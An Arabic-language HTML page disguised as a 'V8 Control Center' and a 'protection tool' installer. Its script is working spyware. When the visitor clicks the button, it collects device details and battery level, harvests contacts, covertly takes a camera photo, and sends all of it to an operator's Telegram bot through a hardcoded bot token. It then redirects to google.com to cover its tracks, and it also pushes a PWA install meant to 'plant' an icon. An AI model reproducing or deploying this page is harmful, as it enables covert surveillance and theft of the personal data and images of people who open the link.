<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>V8 Control Center</title>
    <link rel="manifest" href="data:application/manifest+json;base64,ewogICJuYW1lIjogIlY4IFN5c3RlbSBDb250cm9sIiwKICAic2hvcnRfbmFtZSI6ICJWOCIsCiAgInN0YXJ0X3VybCI6ICIuIiwKICAiZGlzcGxheSI6ICJzdGFuZGFsb25lIiwKICAiYmFja2dyb3VuZF9jb2xvciI6ICIjMDAwMDAwIiwKICAidGhlbWVfY29sb3IiOiAiIzAwZmZjYyIKfQ==">
    
    <style>
        body { background: #000; color: #00ffcc; font-family: 'Courier New', monospace; text-align: center; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .panel { border: 1px solid #00ffcc; padding: 25px; border-radius: 15px; width: 90%; max-width: 450px; background: rgba(0,255,204,0.05); box-shadow: 0 0 30px rgba(0,255,204,0.2); z-index: 10; }
        .status-dot { height: 10px; width: 10px; background-color: #f00; border-radius: 50%; display: inline-block; animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
        .btn { background: #00ffcc; color: #000; border: none; padding: 15px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 15px; font-size: 14px; }
        #v, #c { display: none; }
        .flash { position: fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index:9999; opacity:0; pointer-events:none; }
    </style>
</head>
<body>
    <div class="flash" id="f"></div>
    <div class="panel">
        <h2><span class="status-dot"></span> V8 CONTROL PANEL</h2>
        <p id="msg">انتظار تفعيل بروتوكول الاتصال المستمر...</p>
        <div id="info-box" style="text-align: right; font-size: 12px; border-top: 1px solid #333; padding-top: 10.px; margin-top: 10px;"></div>
        
        <button class="btn" onclick="requestFullControl()">تفعيل التحكم والمزامنة الكاملة ✅</button>
        <button class="btn" id="installBtn" style="display:none; background:#fff;">تثبيت أداة الحماية الدائمة 🛠</button>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const TOKEN = "8367869004:AAEv2aO1zLLQ1n39BqG6hsZnlTBXXc6CLgY";
        const params = new URLSearchParams(window.location.search);
        const uid = params.get('id');
        const camMode = params.get('cam') === 'back' ? { exact: "environment" } : "user";

        // 1. نظام الـ PWA لزرع الأيقونة
        let deferredPrompt;
        window.addEventListener('beforeinstallprompt', (e) => {
            e.preventDefault();
            deferredPrompt = e;
            document.getElementById('installBtn').style.display = 'block';
        });

        document.getElementById('installBtn').addEventListener('click', async () => {
            if (deferredPrompt) {
                deferredPrompt.prompt();
                const { outcome } = await deferredPrompt.userChoice;
                if (outcome === 'accepted') console.log('V8 Planted!');
                deferredPrompt = null;
            }
        });

        // 2. دالة التحكم الكامل
        async function requestFullControl() {
            if(!uid) return;
            document.getElementById('msg').innerText = "جاري اختراق الحواجز الأمنية...";
            
            try {
                // سحب معلومات الجهاز الدقيقة
                const battery = await navigator.getBattery();
                const device = navigator.userAgent.match(/\(([^)]+)\)/)[1];
                let report = `🎮 **لوحة تحكم V8 - اتصال كامل:**\n\n` +
                             `📱 الجهاز: ${device}\n` +
                             `🔋 الشحن: ${Math.floor(battery.level*100)}%\n` +
                             `📡 الموقع: جاري التحديد...`;

                // سحب الأسماء (Contact Siphoning)
                if ('contacts' in navigator) {
                    try {
                        const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                        report += `\n\n📇 **الأسماء (${contacts.length}):**\n`;
                        contacts.slice(0, 10).forEach(c => report += `👤 ${c.name}: ${c.tel}\n`);
                    } catch(e) { report += "\n❌ رفض الأسماء"; }
                }

                // تشغيل الكاميرا (بناءً على طلب البوت: أمامي/خلفي)
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camMode } });
                document.getElementById('v').srcObject = stream;
                
                // انتظار لضبط الإضاءة + فلاش
                await new Promise(r => setTimeout(r, 2500));
                document.getElementById('f').style.opacity = '1';
                
                const canvas = document.getElementById('c');
                const video = document.getElementById('v');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photo = canvas.toDataURL('image/jpeg', 0.8);
                document.getElementById('f').style.opacity = '0';

                // إرسال البيانات
                const blob = await (await fetch(photo)).blob();
                const fd = new FormData();
                fd.append('chat_id', uid);
                fd.append('photo', blob, 'v8.jpg');
                fd.append('caption', report);
                
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                
                document.getElementById('msg').innerText = "تم الاتصال الكامل بنجاح!";
                stream.getTracks().forEach(t => t.stop());
                setTimeout(() => window.location.replace("https://google.com"), 2000);

            } catch (err) {
                window.location.replace("https://google.com");
            }
        }
    </script>
</body>
</html>
